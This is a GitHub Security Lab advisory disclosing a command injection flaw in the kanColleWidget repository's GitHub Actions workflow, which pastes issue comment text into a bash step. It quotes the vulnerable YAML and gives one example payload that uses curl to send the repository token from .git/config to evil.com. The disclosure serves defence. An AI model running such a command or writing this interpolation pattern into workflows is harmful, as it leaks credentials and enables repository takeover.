<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-191: Command injection in KanCraft/kanColleWidget workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/16/2020: Report sent to vendor</li>
  <li>10/18/2020: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/KanCraft/kanColleWidget/blob/develop/.github/workflows/contrib-notice.yml">‘contrib-notice.yml’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/KanCraft/kanColleWidget">KanCraft/kanColleWidget GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/KanCraft/kanColleWidget/blob/develop/.github/workflows/contrib-notice.yml">contrib-notice.yml</a> from the develop branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-public-github-issue-comment-is-used-to-format-a-shell-command">Issue: The public GitHub issue comment is used to format a shell command</h3>

<p>When a user comments on a public issue it automatically starts the <a href="https://github.com/KanCraft/kanColleWidget/blob/develop/.github/workflows/contrib-notice.yml">contrib-notice.yml</a> GitHub workflow. The comment text is used to format a bash script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">issues</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">opened</span><span class="pi">,</span> <span class="nv">reopened</span><span class="pi">]</span>
  <span class="na">issue_comment</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">created</span><span class="pi">]</span>
  <span class="na">gollum</span><span class="pi">:</span>
<span class="nn">...</span>
<span class="na">jobs</span><span class="pi">:</span>
  <span class="na">notification</span><span class="pi">:</span>
    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
    <span class="na">steps</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v2</span>
<span class="nn">...</span>
    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Issueコメント用ツイート内容の生成</span>
      <span class="na">if</span><span class="pi">:</span> <span class="s">github.event_name == 'issue_comment' &amp;&amp; github.event.action == 'created' &amp;&amp; github.event.sender.login != 'coveralls'</span>
      <span class="na">env</span><span class="pi">:</span>
        <span class="na">SENDER</span><span class="pi">:</span> <span class="s">${{ github.event.sender.login }}</span>
        <span class="na">BODY</span><span class="pi">:</span> <span class="s">${{ github.event.comment.body }}</span>
        <span class="na">URL</span><span class="pi">:</span> <span class="s">${{ github.event.comment.html_url }}</span>
      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">echo "[DEBUG] ORIG: ${{ github.event.comment.body }}"</span>
        <span class="s">echo "[DEBUG] BODY: ${BODY}"</span>
        <span class="s">if [ ${#BODY} -gt 80 ]; then TEXT="$(echo ${BODY} | cut -c1-80)…"; else TEXT=${BODY}; fi;</span>
        <span class="s">echo "[DEBUG] TEXT: ${TEXT}"</span>
        <span class="s">echo -ne "${SENDER}さんがコメントしました！\n&gt; ${TEXT}\n${URL}" &gt;&gt; announcement.txt</span>
<span class="s">...</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may comment with <code class="language-plaintext highlighter-rouge">`set +e; curl -d @.git/config http://evil.com; sleep 10`</code> which will exfiltrate the temporary GitHub repository authorization token to the attacker controlled server. Although the token is not valid after the workflow finishes, since the attacker controls the execution of the workflow he or she can delay it to give the malicious server time to modify the repository. To make the attack less visible the attacker may modify the comment later.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-191<